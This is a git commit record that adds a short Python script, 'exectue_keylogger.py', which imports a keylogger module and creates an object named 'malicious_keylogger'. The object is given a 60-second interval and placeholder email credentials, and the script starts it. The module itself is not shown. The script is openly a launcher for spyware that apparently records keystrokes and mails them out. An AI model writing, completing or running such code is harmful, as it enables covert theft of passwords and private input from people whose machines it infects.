f06d7bb6ca900c488028c3800500cefcb9b9b179
Sidd <siddharthsaxena2001@gmail.com>
2023-01-10 12:25:13 +0530

    first commit

---
+++ exectue_keylogger.py
@@ -0,0 +1,12 @@
+import keylogger
+
+
+# Initialize / create keylogger
+import keylogger
+
+
+malicious_keylogger: keylogger.KeyLogger = keylogger.KeyLogger(60, 'your_mail_id@gmail.com', 'mail_password')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
